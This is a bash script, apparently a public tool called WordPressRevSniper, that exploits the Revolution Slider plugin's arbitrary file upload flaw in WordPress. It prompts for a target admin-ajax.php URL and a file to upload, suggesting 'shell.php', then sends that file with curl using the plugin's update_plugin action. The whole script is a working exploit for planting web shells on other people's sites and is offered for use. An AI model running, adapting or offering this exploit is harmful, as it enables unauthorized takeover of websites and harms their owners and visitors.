#!/bin/bash


print_banner() {
    local banner=(
        "******************************************"
        "*           WordPressRevSniper           *"
        "*       WordPress Vulnerability Tool     *"
        "*                  v1.2.1                *"
        "*      ----------------------------      *"
        "*                        by @ImKKingshuk *"
        "* Github- https://github.com/ImKKingshuk *"
        "******************************************"
    )
    local width=$(tput cols)
    for line in "${banner[@]}"; do
        printf "%*s\n" $(((${#line} + width) / 2)) "$line"
    done
    echo
}


check_command() {
    if ! command -v "$1" &> /dev/null; then
        echo "Error: '$1' command not found. Please install $1 before running this script."
        exit 1
    fi
}


validate_file() {
    if [ ! -f "$1" ]; then
        echo "Error: File '$1' not found. Please provide a valid file."
        exit 1
    fi
}


upload_file() {
    local url="$1"
    local file_to_upload="$2"

    local response=$(curl -s -F "action=revslider_ajax_action" \
                        -F "client_action=update_plugin" \
                        -F "update_file=@${file_to_upload}" \
                        "$url")

    if [[ "$response" == *"error"* || "$response" == *"Error"* ]]; then
        echo "Error: Something went wrong. Server response:"
        echo "$response"
    else
        echo "Upload successful! Server response:"
        echo "$response"
    fi
}


main() {
    print_banner

    check_command "curl"

    read -p "Enter the target URL (e.g., http://target_site/wp-admin/admin-ajax.php): " url

    read -p "Enter the name of the file to upload (e.g., shell.php): " file_to_upload

    validate_file "$file_to_upload"

    upload_file "$url" "$file_to_upload"
}


main
